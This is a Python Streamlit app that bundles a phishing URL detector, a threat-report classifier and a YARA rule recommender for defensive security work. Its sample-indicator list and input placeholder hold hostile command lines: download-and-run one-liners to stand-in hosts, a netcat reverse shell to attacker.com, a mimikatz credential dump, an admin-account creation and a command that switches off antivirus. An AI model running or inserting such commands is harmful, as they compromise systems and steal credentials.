import streamlit as st
import pandas as pd
import re
import nltk
import random
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
import shap
from urllib.parse import urlparse
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline
from nltk.corpus import stopwords

st.set_page_config(
    page_title="Cyber Security Toolkit",
    page_icon="🛡️",
    layout="wide"
)

st.sidebar.markdown(
    """
    <div style="
        font-size:28px;
        font-weight:900;
        color:#3b82f6;
        text-align:center;
        padding:12px 0;
        margin-bottom:20px;
        border-bottom:2px solid #1e40af;
    ">
        🔧 Tools Menu
    </div>
    """,
    unsafe_allow_html=True
)

# Button style
st.sidebar.markdown("""
<style>
.sidebar .stButton > button {
    width: 100%;
    padding: 12px 10px;
    margin: 6px 0;
    border-radius: 10px;
    background-color: #0e8aeb;
    color: white;
    font-weight: bold;
    font-size: 16px;
}
.sidebar .stButton > button:hover {
    background-color: #0b6fbf;
}
.stButton>button {
        background: linear-gradient(135deg, #3b82f6, #1d4ed8);
        color: white;
        font-weight: 800;
        padding: 12px 22px;
        border-radius: 16px;
        border: none;
        box-shadow: 0 10px 25px rgba(59, 130, 246, 0.35);
        transition: transform 0.2s ease, box-shadow 0.2s ease, filter 0.2s ease;
    }

    /* Hover effect */
    .stButton>button:hover {
        transform: translateY(-3px);
        box-shadow: 0 14px 30px rgba(59, 130, 246, 0.5);
        filter: brightness(1.1);
    }

    /* Click effect */
    .stButton>button:active {
        transform: translateY(1px);
        box-shadow: 0 8px 18px rgba(59, 130, 246, 0.35);
    }

    /* Loading animation */
    .stButton>button:focus {
        outline: none;
    }
</style>
""", unsafe_allow_html=True)

# Buttons
if st.sidebar.button("🚨 Phishing URL Detector"):
    st.session_state.main_menu = "Phishing URL Detector"

if st.sidebar.button("🔐 Cyber Threat Intelligence Classifier"):
    st.session_state.main_menu = "🔐 Cyber Threat Intelligence Classifier"

if st.sidebar.button("🛡️ YARA Rule Recommendation Tool"):
    st.session_state.main_menu = "🛡️ YARA Rule Recommendation Tool"

# Default menu
menu = st.session_state.get("main_menu", "Phishing URL Detector")

# Page logic
if menu == "Phishing URL Detector":
    # -----------------------
    # Feature extraction
    # -----------------------
    def extract_features(url):
        url = url.strip()
        parsed = urlparse(url)

        features = {
            "has_https": 1 if url.startswith("https://") else 0,
            "has_at": 1 if "@" in url else 0,
            "length": len(url),
            "dots": url.count("."),
            "has_ip": 1 if re.search(r"\d+\.\d+\.\d+\.\d+", url) else 0,
            "has_suspicious_keyword": 1 if any(
                k in url.lower()
                for k in ["login", "secure", "verify", "update", "account", "bank", "confirm", "signin", "password"]
            ) else 0,
            "has_dash": 1 if "-" in url else 0,
            "has_port": 1 if parsed.port else 0,
            "path_segments": len([p for p in parsed.path.split("/") if p]),
            "has_encoded": 1 if "%" in url else 0,
            "has_shortener": 1 if any(short in url for short in ["bit.ly", "tinyurl", "goo.gl"]) else 0,
            "has_query": 1 if parsed.query else 0,
            "non_alpha_num": len(re.findall(r"[^a-zA-Z0-9:/.?&=-]", url))
        }

        return features


    # -----------------------
    # Dataset (Real CSV) - FIXED
    # -----------------------
    df = pd.read_csv("processed_urls.csv")

    # Normalize column names
    df.columns = [c.lower().strip() for c in df.columns]

    # Auto-detect URL column
    url_col = None
    for c in df.columns:
        if "url" in c or "link" in c or "website" in c:
            url_col = c
            break

    # Auto-detect label column
    label_col = None
    for c in df.columns:
        if c in ["label", "class", "result", "is_phishing", "type"]:
            label_col = c
            break

    # Safety check
    if url_col is None or label_col is None:
        st.error("❌ Could not detect URL or Label column in dataset")
        st.stop()

    # Rename to standard names
    df.rename(columns={url_col: "url", label_col: "label"}, inplace=True)

    # Clean data
    df["url"] = df["url"].astype(str)
    df = df.dropna(subset=["url", "label"])

    # Normalize labels if needed
    df["label"] = df["label"].replace({
        "phishing": 1,
        "legitimate": 0,
        -1: 1
    }).astype(int)

    # Feature extraction
    X = pd.DataFrame([extract_features(u) for u in df["url"]])
    y = df["label"]

    # -----------------------
    # Train model
    # -----------------------
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
    model = RandomForestClassifier()
    model.fit(X_train, y_train)

    # -----------------------
    # Feature description mapping
    # -----------------------
    feature_desc = {
        "has_https": "Secure websites use HTTPS to encrypt data. Missing HTTPS is a warning sign.",
        "has_at": "The '@' symbol can be used to mask the real domain. The browser ignores everything before '@'.",
        "length": "Very long URLs are often used to hide malicious domains or tracking codes.",
        "dots": "Many dots mean multiple subdomains. Attackers use this to mimic legitimate sites.",
        "has_ip": "Using an IP address instead of a domain is common in phishing links.",
        "has_suspicious_keyword": "Words like 'login', 'verify', 'update' are commonly used in phishing.",
        "has_dash": "Dashes are often used to mimic real domains (example-bank.com).",
        "has_port": "Custom port numbers are unusual for normal websites and can be suspicious.",
        "path_segments": "Many path segments indicate a complex URL, often used to hide phishing pages.",
        "has_encoded": "Encoded characters (%) can hide the real URL or payload.",
        "has_shortener": "Shortened URLs hide the destination link and are often used in scams.",
        "has_query": "Query parameters can be used to track victims or hide malicious data.",
        "non_alpha_num": "Many special characters indicate manipulation or obfuscation."
    }


    # -----------------------
    # Rule-based explanation
    # -----------------------
    def rule_reasons(features):
        reasons = []

        if features["has_https"] == 0:
            reasons.append("🔴 **No HTTPS**: Data may be intercepted or modified.")
        if features["has_at"] == 1:
            reasons.append("🔴 **@ Symbol Detected**: Domain is hidden after '@'.")
        if features["length"] > 75:
            reasons.append("🟠 **Very Long URL**: Used to hide malicious content.")
        if features["dots"] > 4:
            reasons.append("🟠 **Many Subdomains**: Often used to mimic real sites.")
        if features["has_ip"] == 1:
            reasons.append("🔴 **IP Address Used**: Avoids domain-based detection.")
        if features["has_suspicious_keyword"] == 1:
            reasons.append("🟠 **Suspicious Keywords**: Like login, verify, password.")
        if features["has_dash"] == 1:
            reasons.append("🟠 **Dash in Domain**: Common in fake URLs.")
        if features["has_port"] == 1:
            reasons.append("🟠 **Port Number Present**: Unusual for normal websites.")
        if features["path_segments"] > 5:
            reasons.append("🟠 **Many Path Segments**: Suspicious URL structure.")
        if features["has_encoded"] == 1:
            reasons.append("🟠 **Encoded Characters (%)**: Used to hide URL content.")
        if features["has_shortener"] == 1:
            reasons.append("🟠 **URL Shortener**: Hides destination link.")
        if features["has_query"] == 1:
            reasons.append("🟠 **Query Parameters**: Used for tracking or payloads.")
        if features["non_alpha_num"] > 5:
            reasons.append("🟠 **Many Special Characters**: Indicates obfuscation.")

        return reasons


    # -----------------------
    # UI
    # -----------------------
    st.set_page_config(page_title="Phishing URL Detector", layout="wide")

    st.markdown("""
    <style>
    /* ===== Page Background ===== */
    body {
        background: #0b0f17;
    }

    /* ===== Card ===== */
    .card {
        background: #121826 !important;
        padding: 22px;
        border-radius: 18px;
        border: 1px solid #1b2430;
    }

    /* ===== Title ===== */
    .title {
        font-size: 42px;
        font-weight: 900;
        margin-bottom: 6px;
        color: #ffffff;
    }
    .subtitle {
        font-size: 16px;
        color: #c7c7c7;
        margin-bottom: 22px;
    }

    /* ===== Risk Score ===== */
    .risk-score {
        color: #ffffff !important;
        font-size: 30px;
        font-weight: 900;
    }

    /* ===== Badge ===== */
    .badge {
        font-size: 15px;
        font-weight: 800;
        padding: 10px 16px;
        border-radius: 999px;
        display: inline-block;
        letter-spacing: 0.2px;
    }

    /* ===== Button ===== */
    .stButton>button {
        background: linear-gradient(135deg, #3b82f6, #1d4ed8);
        color: white;
        font-weight: 800;
        padding: 10px 18px;
        border-radius: 14px;
    }

    /* ===== Tabs ===== */
    .stTabs [role="tab"] {
        font-weight: 800;
    }
    .stButton>button {
        background: linear-gradient(135deg, #3b82f6, #1d4ed8);
        color: white;
        font-weight: 800;
        padding: 12px 22px;
        border-radius: 16px;
        border: none;
        box-shadow: 0 10px 25px rgba(59, 130, 246, 0.35);
        transition: transform 0.2s ease, box-shadow 0.2s ease, filter 0.2s ease;
    }

    /* Hover effect */
    .stButton>button:hover {
        transform: translateY(-3px);
        box-shadow: 0 14px 30px rgba(59, 130, 246, 0.5);
        filter: brightness(1.1);
    }

    /* Click effect */
    .stButton>button:active {
        transform: translateY(1px);
        box-shadow: 0 8px 18px rgba(59, 130, 246, 0.35);
    }

    /* Loading animation */
    .stButton>button:focus {
        outline: none;
    }
    </style>
    """, unsafe_allow_html=True)

    st.markdown("<div class='title'>🚨 Phishing URL Detector</div>", unsafe_allow_html=True)
    st.markdown("<div class='subtitle'>Paste any URL</div>", unsafe_allow_html=True)

    url_input = st.text_input("🔗 Paste URL here:")

    if st.button("Check"):
        features = None
        feature_df = None

        if not url_input:
            st.warning("⚠️ Please paste a URL first.")
        else:
            features = extract_features(url_input)
            feature_df = pd.DataFrame([features])

            # Ensure feature order same as training
            feature_df = feature_df[X_train.columns]

            risk = model.predict_proba(feature_df)[0][1]

            if risk > 0.7:
                badge_html = "<span class='badge' style='background:#ff2b2b;color:white;'>HIGH RISK</span>"
            elif risk > 0.4:
                badge_html = "<span class='badge' style='background:#ff9a00;color:white;'>MEDIUM RISK</span>"
            else:
                badge_html = "<span class='badge' style='background:#2fcf6a;color:white;'>LOW RISK</span>"

            st.markdown(f"""
                <h2 class='risk-score'>
                    Risk Score: <span style='color:#ffffff;'>{risk:.2f}</span>
                    {badge_html}
                </h2>
                <p style='color:#a8b0b8; margin-top:8px; font-size: 20px;'>
                    The risk score is calculated using the trained model.
                </p>
            """, unsafe_allow_html=True)

            st.markdown("</div>", unsafe_allow_html=True)

            st.markdown("</div>", unsafe_allow_html=True)

        st.markdown("</div>", unsafe_allow_html=True)

        # ✅ Show tabs ONLY after prediction
        if features is not None and feature_df is not None:

            tab1, tab2 = st.tabs(["🧠 Rule-based Reasons", "📌 Model-based Reasons"])

            # =========================
            # 🧠 RULE-BASED TAB
            # =========================
            with tab1:
                st.markdown(
                    "<div style='font-size:26px; font-weight:900; margin-bottom:16px;'>"
                    "🚨 Rule-based Detection Reasons"
                    "</div>",
                    unsafe_allow_html=True
                )

                reasons = rule_reasons(features)
                if reasons:
                    for r in reasons:
                        st.markdown(
                            f"""
                            <div style="
                                font-size:20px;
                                padding:12px 16px;
                                margin-bottom:10px;
                                background:#111827;
                                border-left:6px solid #ef4444;
                                border-radius:12px;
                                color:#e5e7eb;
                            ">
                                {r}
                            </div>
                            """,
                            unsafe_allow_html=True
                        )
                else:
                    st.markdown(
                        "<div style='font-size:20px; color:#22c55e; font-weight:700;'>"
                        "✅ No suspicious patterns found."
                        "</div>",
                        unsafe_allow_html=True
                    )

            # =========================
            # 📌 MODEL-BASED TAB
            # =========================
            with tab2:
                st.markdown(
                    "<div style='font-size:26px; font-weight:900; margin-bottom:16px;'>"
                    "📌 Model-based Feature Contribution (SHAP)"
                    "</div>",
                    unsafe_allow_html=True
                )

                explainer = shap.TreeExplainer(model)
                shap_values = explainer.shap_values(feature_df)

                shap_vals = shap_values[1] if isinstance(shap_values, list) else shap_values
                shap_vals = np.array(shap_vals).reshape(-1)

                feature_importance = list(zip(feature_df.columns, shap_vals))
                feature_importance.sort(key=lambda x: abs(float(x[1])), reverse=True)

                for feat, val in feature_importance[:6]:
                    impact = "increases" if float(val) > 0 else "decreases"
                    color = "#ef4444" if val > 0 else "#22c55e"

                    st.markdown(
                        f"""
                        <div style="
                            background:#0f172a;
                            padding:16px;
                            border-radius:14px;
                            margin-bottom:14px;
                            border-left:6px solid {color};
                        ">
                            <div style="font-size:22px; font-weight:800; color:white;">
                                {feat.replace('_', ' ').title()}
                            </div>
                            <div style="font-size:18px; margin-top:6px;">
                                🔥 This feature <b style="color:{color};">{impact}</b> phishing risk
                            </div>
                            <div style="font-size:16px; color:#cbd5f5; margin-top:6px;">
                                {feature_desc[feat]}
                            </div>
                            <div style="font-size:15px; margin-top:6px; color:#94a3b8;">
                                Impact score: {abs(float(val)):.3f}
                            </div>
                        </div>
                        """,
                        unsafe_allow_html=True
                    )

            # =========================
            # FOOTER
            # =========================
            st.markdown("---")
            st.markdown(
                "<div style='font-size:18px; color:#94a3b8;'>"
                "🔎 Tip: Model-based explanations use <b>SHAP values</b> to show how each feature "
                "influenced the phishing risk score."
                "</div>",
                unsafe_allow_html=True
            )
    st.subheader("🔗 Real‑World URL Example Generator")

    example_urls = [
        "https://accounts.google.com/signin",
        "https://login.microsoftonline.com",
        "https://www.amazon.in",
        "http://secure-paypal.com.login-update.info",
        "https://bankofamerica.verify-login.com",
        "http://update-paypal.com.secure-login.net",
        "https://account-update.online/login",
        "https://bit.ly/3XyZ123",
        "https://tinyurl.com/secure-login",
        "https://192.168.1.10/login",
        "http://185.234.219.11/verify",
        "https://secure.icicibank.verify-user.net",
        "https://mail.google.com",
        "https://signin-ebay.com.account-confirm.net",
        "http://appleid.apple.com.verify-login.cc",
        "https://dropbox.com",
        "https://onedrive.live.com",
        "http://login-facebook.com.security-check.info",
        "https://aws.amazon.com",
        "http://confirm-netflix-billing.com",
        "https://support.microsoft.com",
        "http://secure-update-instagram.com",
        "https://github.com/login",
        "http://verify-paytm-account.in",
        "https://portal.office.com"
    ]

    if st.button("🎲 Generate Real‑World URL"):
        import random

        generated_url = random.choice(example_urls)

        st.markdown("### 📋 Copy This URL")
        st.code(generated_url, language="text")

        # Optional auto‑fill input
        url_input = generated_url

elif menu == "🔐 Cyber Threat Intelligence Classifier":

    st.title("🔐 Cyber Threat Intelligence Text Classifier")
    st.write(
        "Classify cyber threat reports/news into **Malware, Phishing, "
        "Ransomware, DDoS, and Exploit** categories using NLP."
    )


    # --------------------------------------------
    # NLTK Setup
    # --------------------------------------------
    @st.cache_resource
    def load_stopwords():
        nltk.download("stopwords")
        return set(stopwords.words("english"))


    STOPWORDS = load_stopwords()


    # --------------------------------------------
    # Text Preprocessing
    # --------------------------------------------
    def clean_text(text):
        text = text.lower()
        text = re.sub(r"http\S+|www\S+", " ", text)
        text = re.sub(r"[^a-z\s]", " ", text)
        text = re.sub(r"\s+", " ", text).strip()
        text = " ".join([w for w in text.split() if w not in STOPWORDS])
        return text


    # --------------------------------------------
    # Auto Labeling Logic
    # --------------------------------------------
    def label_threat(text):
        if "ransomware" in text:
            return "Ransomware"
        elif "phishing" in text:
            return "Phishing"
        elif "ddos" in text or "denial service" in text:
            return "DDoS"
        elif "malware" in text or "trojan" in text or "worm" in text:
            return "Malware"
        elif "exploit" in text or "vulnerability" in text:
            return "Exploit"
        else:
            return "Other"


    # --------------------------------------------
    # Load & Train Model (Cached)
    # --------------------------------------------
    @st.cache_resource
    def train_model():
        df = pd.read_csv("cyber_threat_intel.csv")
        df = df.dropna(subset=["text"])

        df["clean_text"] = df["text"].apply(clean_text)
        df["label"] = df["clean_text"].apply(label_threat)
        df = df[df["label"] != "Other"]

        X = df["clean_text"]
        y = df["label"]

        model = Pipeline([
            ("tfidf", TfidfVectorizer(
                max_features=5000,
                ngram_range=(1, 2)
            )),
            ("clf", LogisticRegression(
                max_iter=1000,
                class_weight="balanced"
            ))
        ])

        model.fit(X, y)
        return model


    model = train_model()


    # --------------------------------------------
    # Keyword Extraction
    # --------------------------------------------
    def extract_keywords(text, top_n=5):
        tfidf = model.named_steps["tfidf"]
        features = tfidf.get_feature_names_out()
        vector = tfidf.transform([text]).toarray()[0]
        top_idx = vector.argsort()[-top_n:][::-1]
        return [features[i] for i in top_idx if vector[i] > 0]


    # --------------------------------------------
    # User Input
    # --------------------------------------------
    st.subheader("📝 Enter Cyber Threat Report Text")
    user_input = st.text_area(
        "Paste threat intelligence report, blog, or news article:",
        height=220
    )

    # --------------------------------------------
    # Prediction
    # --------------------------------------------
    if st.button("🔍 Predict Threat Category"):
        if user_input.strip() == "":
            st.warning("Please enter some text.")
        else:
            clean = clean_text(user_input)
            prediction = model.predict([clean])[0]
            keywords = extract_keywords(clean)

            st.markdown(
                f"""
                <div style="
                    font-size:32px;
                    font-weight:900;
                    color:#16a34a;
                    margin-top:20px;
                ">
                    🔍 Threat Category: {prediction}
                </div>
                """,
                unsafe_allow_html=True
            )

            st.markdown(
                "<div style='font-size:22px; font-weight:700;'>🧠 Key Extracted Terms:</div>",
                unsafe_allow_html=True
            )

            st.markdown(
                f"<div style='font-size:18px;'>{', '.join(keywords)}</div>",
                unsafe_allow_html=True
            )

    # --------------------------------------------
    # Footer
    # --------------------------------------------
    st.markdown("---")
    st.caption(
        "📌 NLP-based Cyber Threat Intelligence Classifier | "
        "TF-IDF + Machine Learning"
    )
    st.subheader("📝 Real‑World Threat Report Generator")

    example_reports = [
        "LockBit ransomware encrypts enterprise data and demands Bitcoin ransom.",
        "Phishing emails impersonate Microsoft Office 365 login pages.",
        "Mirai botnet launches large-scale DDoS attacks against ISPs.",
        "Emotet malware spreads via malicious Excel attachments.",
        "CVE-2023-23397 exploited to leak NTLM hashes in Outlook.",
        "WannaCry ransomware propagates via SMB vulnerability.",
        "Credential harvesting campaign targets PayPal users.",
        "APT28 uses spear phishing to deploy malware payloads.",
        "Trojanized PDF files deliver remote access trojans.",
        "DDoS attack overwhelms financial institution servers.",
        "Zero-day exploit found in Apache web servers.",
        "Malware uses PowerShell for lateral movement.",
        "Phishing SMS messages target banking customers.",
        "Ransomware disables backup services before encryption.",
        "Botnet performs credential stuffing attacks.",
        "Exploit kit delivers payload via browser vulnerability.",
        "Keylogger malware records keystrokes and screenshots.",
        "Malicious JavaScript injects skimmer into e-commerce sites.",
        "Supply chain attack compromises software updates.",
        "Credential phishing campaign abuses Google Forms.",
        "Backdoor malware establishes persistent C2 channel.",
        "Exploit allows privilege escalation on Linux servers.",
        "Malware spreads via infected USB drives.",
        "Phishing campaign impersonates government portals.",
        "DDoS-for-hire service targets online gaming servers."
    ]

    if st.button("🎲 Generate Real‑World Threat Report"):
        import random

        generated_report = random.choice(example_reports)

        st.markdown("### 📋 Copy This Threat Report")
        st.code(generated_report, language="text")

        # Optional: auto-fill the text area
        user_input = generated_report

if menu == "🛡️ YARA Rule Recommendation Tool":

    st.title("🛡️ YARA Rule Recommendation Tool")
    st.markdown(
        "AI-assisted engine that recommends **YARA rule patterns** "
        "from malware strings using **TF-IDF + cosine similarity**."
    )

    # --------------------------------------------------
    # LOAD CSV DATASET
    # --------------------------------------------------
    @st.cache_data
    def load_dataset():
        df = pd.read_csv("yara_rules_clean.csv")
        df = df.dropna(subset=["rule_text"])
        df["rule_text"] = df["rule_text"].astype(str)
        return df

    df = load_dataset()

    # --------------------------------------------------
    # EXTRACT STRINGS FROM YARA RULES
    # --------------------------------------------------
    def extract_strings(rule_text):
        strings = re.findall(r'\$[a-zA-Z0-9_]+\s*=\s*(.+)', rule_text)
        return " ".join(strings).lower()

    df["strings_only"] = df["rule_text"].apply(extract_strings)
    df = df[df["strings_only"].str.len() > 0]

    # --------------------------------------------------
    # TF-IDF MODEL
    # --------------------------------------------------
    @st.cache_resource
    def build_model(corpus):
        vectorizer = TfidfVectorizer(
            analyzer="char_wb",
            ngram_range=(3, 5),
            max_features=50000
        )
        X = vectorizer.fit_transform(corpus)
        return vectorizer, X

    vectorizer, X = build_model(df["strings_only"])

    # --------------------------------------------------
    # SIDEBAR SETTINGS
    # --------------------------------------------------
    st.sidebar.header("⚙️ Settings")
    top_n = st.sidebar.slider("Number of recommendations", 1, 10, 5)

    # --------------------------------------------------
    # USER INPUT
    # --------------------------------------------------
    query = st.text_area(
        "🔍 Paste malware strings / suspicious indicators",
        height=180,
        placeholder=(
            "Example:\n"
            "powershell -nop -w hidden -enc SQBFAFgA\n"
            "Invoke-WebRequest http://malicious.site/payload.exe"
        )
    )

    # --------------------------------------------------
    # BEHAVIOR DETECTION
    # --------------------------------------------------
    def detect_behavior(query):
        q = query.lower()
        if "powershell" in q and "invoke-webrequest" in q:
            return "Downloader"
        if "-enc" in q or "frombase64string" in q:
            return "Obfuscation"
        if "beacon" in q or "reflectiveloader" in q:
            return "C2"
        return "Generic"

    # --------------------------------------------------
    # KEYWORD BOOSTING
    # --------------------------------------------------
    def keyword_boost(rule_text, query):
        boost = 0.0
        keywords = [
            "powershell",
            "invoke-webrequest",
            "-enc",
            "frombase64string",
            "http://",
            "https://"
        ]

        q = query.lower()
        for kw in keywords:
            if kw in rule_text and kw in q:
                boost += 0.15

        return boost


    def get_match_details(rule_text, query):
        matched_terms = []
        q_terms = query.lower().split()
        rule_lower = rule_text.lower()

        for term in q_terms:
            if term in rule_lower:
                matched_terms.append(term)

        return matched_terms


    # --------------------------------------------------
    # RECOMMENDATION ENGINE
    # --------------------------------------------------
    def recommend_rules(query, top_n):
        q_vec = vectorizer.transform([query.lower()])
        scores = cosine_similarity(q_vec, X).flatten()

        df_scores = df.copy()
        df_scores["score"] = scores
        df_scores["matched_terms"] = df_scores["strings_only"].apply(
            lambda x: get_match_details(x, query)
        )

        # Remove benign rules
        df_scores = df_scores[~df_scores["rule_name"].str.contains("benign", case=False, na=False)]

        # Keyword boost
        df_scores["score"] += df_scores["strings_only"].apply(lambda x: keyword_boost(x, query))

        # Penalize generic APT/frameworks
        if "family" in df_scores.columns:
            df_scores.loc[
                df_scores["family"].str.contains("cobalt|cobra|apt", case=False, na=False),
                "score"
            ] *= 0.6

        # Behavior-based filtering
        behavior = detect_behavior(query)
        if behavior == "Downloader":
            df_scores = df_scores[
                df_scores["strings_only"].str.contains(
                    "powershell|invoke-webrequest|download|payload|-enc",
                    case=False,
                    na=False
                )
            ]

        # Drop weak matches
        df_scores = df_scores[df_scores["score"] > 0.10]

        # Sort
        df_scores = df_scores.sort_values("score", ascending=False)

        return df_scores.head(top_n), df_scores["score"].head(top_n), df_scores["matched_terms"].head(top_n)

    # --------------------------------------------------
    # RUN BUTTON
    # --------------------------------------------------
    if st.button("🚀 Recommend YARA Rules"):
        if not query.strip():
            st.warning("Please enter malware strings or indicators.")
        else:
            results, scores, matched_terms = recommend_rules(query, top_n)

            risk = round(scores.max() * 100, 2) if len(scores) > 0 else 0.0

            # Threat score
            st.markdown(
                "<div style='font-size:28px;font-weight:700;margin-bottom:10px;'>📊 Threat Confidence Score</div>",
                unsafe_allow_html=True)
            st.progress(min(int(risk), 100))
            st.markdown(
                f"<div style='font-size:22px;font-weight:600;margin-top:8px;'>Risk Score: <span style='color:#ff4b4b;'>{risk}%</span></div>",
                unsafe_allow_html=True)

            # Results
            st.subheader("📌 Recommended YARA Rules")
            if results.empty:
                st.warning("No strong YARA rule matches found.")
            else:
                for i, (_, row) in enumerate(results.iterrows()):
                    with st.expander(f"🧩 {row.get('rule_name', 'Unknown Rule')}"):
                        st.code(row["rule_text"], language="yara")
                        st.markdown(
                            f"**Matched Terms:** {', '.join(matched_terms.iloc[i]) if matched_terms.iloc[i] else 'None'}")
                        st.markdown(
                            f"**Reason:** This rule was recommended because it contains strings similar to your query and matches behavior: **{detect_behavior(query)}**.")

            behavior = detect_behavior(query)
            st.info(f"🧠 Detected Behavior: **{behavior}**")

    # --------------------------------------------------
    # FOOTER
    # --------------------------------------------------
    st.markdown("---")
    st.markdown(
        "Built using **TF-IDF, cosine similarity & Streamlit**  \n"
        "🧠 Designed for SOC & Malware Research workflows"
    )
    st.subheader("🔍 Real‑World Malware String Generator")

    example_strings = [
        "powershell -nop -w hidden -enc SQBFAFgA",
        "Invoke-WebRequest http://malicious.site/payload.exe",
        "IEX(New-Object Net.WebClient).DownloadString('http://bad.site/a.ps1')",
        "cmd /c start C:\\Users\\Public\\svchost.exe",
        "frombase64string('c2VjcmV0cGF5bG9hZA==')",
        "ReflectiveLoader beacon.dll",
        "schtasks /create /sc onlogon /tn Update /tr malware.exe",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "certutil -decode payload.b64 payload.exe",
        "bitsadmin /transfer job http://evil.site/payload.exe",
        "mshta http://malicious.site/dropper.hta",
        "wmic process call create malware.exe",
        "net user attacker P@ssw0rd /add",
        "net localgroup administrators attacker /add",
        "rundll32.exe payload.dll,EntryPoint",
        "curl http://bad.site/payload.sh | bash",
        "wget http://evil.site/b.sh -O /tmp/b.sh",
        "chmod +x /tmp/b.sh && /tmp/b.sh",
        "mimikatz.exe sekurlsa::logonpasswords",
        "taskkill /f /im antivirus.exe",
        "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
        "sc create backdoor binpath= malware.exe",
        "beacon.exe -connect c2.server.com",
        "python -c \"import socket,subprocess\"",
        "nc -e /bin/sh attacker.com 4444"
    ]

    if st.button("🎲 Generate Real‑World Malware String"):
        import random

        generated_string = random.choice(example_strings)

        st.markdown("### 📋 Copy This Malware String")
        st.code(generated_string, language="bash")

        # Optional: auto-fill input box
        query = generated_string
